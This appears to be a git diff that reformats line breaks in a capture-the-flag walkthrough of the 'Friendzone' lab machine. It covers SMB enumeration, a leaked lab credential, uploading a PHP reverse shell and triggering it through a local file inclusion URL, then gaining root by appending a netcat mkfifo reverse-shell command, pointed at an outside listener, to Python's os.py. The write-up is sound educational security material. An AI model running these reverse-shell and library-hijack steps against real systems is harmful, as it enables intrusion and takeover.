@@ -87,12 +87,12 @@ Nmap done: 1 IP address (1 host up) scanned in 81.10 seconds
 
 ## Enumeration
 
-As we can see that smb services are open so try to enumerate it. </br>
+As we can see that smb services are open so try to enumerate it.  
 * Using smbmap
 
 smbmap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download
 functionality,file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to
-simplify searching for potentially sensitive data across large networks. </br>
+simplify searching for potentially sensitive data across large networks.  
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/smbmap.png)
 
@@ -100,7 +100,7 @@ As by using smbmap we found two share drives
 * general (READ only)
 * Development (READ, WRITE)
 
-Now try to connect with the smbclient service to the shared drives </br>
+Now try to connect with the smbclient service to the shared drives  
 * Using smbclient
 let us assume there might some malicious content.
 
@@ -112,7 +112,7 @@ smbclient is a client that can 'talk' to an SMB/CIFS server.
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/dev.png)
 
-As there is nothing in this folder. </br>
+As there is nothing in this folder.  
 
 **Let's try with the general folder**
 
@@ -120,20 +120,20 @@ As there is nothing in this folder. </br>
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/gen.png)
 
-We found a txt file named **creds.txt** </br>
-Download the file `get creds.txt` </br>
-Read that file `cat creds.txt` </br>
+We found a txt file named **creds.txt**  
+Download the file `get creds.txt`  
+Read that file `cat creds.txt`  
 
 We found a credential but we dont know where to use this
 * `admin:WORKWORKHhallelujah@#`
 
-**We are done with smb enumeration** </br>
+**We are done with smb enumeration**  
 
-I have tried the credentials which we have found from the creds.txt but it didn't work. </br>
+I have tried the credentials which we have found from the creds.txt but it didn't work.  
 
-**I have also tried to enumerate the website but didn't found suspicious.**</br>
+**I have also tried to enumerate the website but didn't found suspicious.**  
 
-As nmap aslo shows us that dns service is open. </br>
+As nmap aslo shows us that dns service is open.  
 
 **Let's try to enumerate dns service**
 
@@ -157,9 +157,9 @@ Let's enumerate the `administrator1.friendzone.red.`
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/http.png)
 
-We got this page but nothing suspicious like administration  </br>
+We got this page but nothing suspicious like administration  
 
-**Wait nmap shows https service is also open**</br>
+**Wait nmap shows https service is also open**  
 **Let's try** `administrator1.friendzone.red.` **with https**
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/https.png)
@@ -185,12 +185,12 @@ We got a **HAHA** image
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/haha.png)
 
-But at bottom of the page we got something suspicious</br>
+But at bottom of the page we got something suspicious  
 **Final Access timestamp is 1596732990**
 
-The timestamp might be some filename so in the same way we can execute our shell too </br>
-But firstly we have to upload our shell on the webserver </br>
-but there is no way to upload file on the website </br>
+The timestamp might be some filename so in the same way we can execute our shell too  
+But firstly we have to upload our shell on the webserver  
+but there is no way to upload file on the website   
 
 **Wait** we can upload the file through smbserver file share with **Development** folder
 
@@ -198,8 +198,8 @@ So we upload our php **reverse shell**
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/she.png)
 
-Now its time to execute our reverse shell</br>
-But where our reverse shell php file is stored </br>
+Now its time to execute our reverse shell  
+But where our reverse shell php file is stored   
 
 let's check where smbclient stores files
 * `smbclient -L friendzone.red.`
@@ -208,7 +208,7 @@ let's check where smbclient stores files
 
 We can see that samba store files in **/etc/files**
 
-So we can execute our shell through </br>
+So we can execute our shell through   
 and also start the listener
 * `https://administrator1.friendzone.red./dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell`
 
@@ -226,8 +226,8 @@ we can see that we are only **www-data** user and we can't read user.txt now.
 
 We have to escalate our privelages 
 
-**Let's enumerate** </br>
-after sometime we found a `mysql_data.conf` file </br>
+**Let's enumerate**   
+after sometime we found a `mysql_data.conf` file  
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/mysql.png)
 
@@ -254,7 +254,7 @@ Now let's read user.txt
 
 Now escalate our privelage to **root**
 
-After looking for **SUID bit set** we didn't found anything suspicious</br>
+After looking for **SUID bit set** we didn't found anything suspicious  
 So we look for background running processes 
 
 **Let's transfer ![pspy32](https://github.com/DominicBreuker/pspy) to check what process is running in background**
@@ -276,7 +276,7 @@ We have found that reporter.py is running with **root** privelages
 
 Now lets see what we can catch from reporter.py
 
-We didn't find any vulnerablity in the **reporter.py** source code </br>
+We didn't find any vulnerablity in the **reporter.py** source code  
 But in that we got about that the code is import **os module**
 
 ```
@@ -307,12 +307,12 @@ we found there are two files
 * os.py
 * os.pyc
 
-Now let's append our reverse shell in python2.7 folder where os.py located</br>
+Now let's append our reverse shell in python2.7 folder where os.py located  
 Basically we will append our reverse shell in os.py so that when the process run we got a shell.
 
 `echo 'import os; os.system(" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f ");' >> os.py`
 
-before executing this start the listener </br>
+before executing this start the listener  
 we will got our shell in few seconds or minutes later
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/root.png)
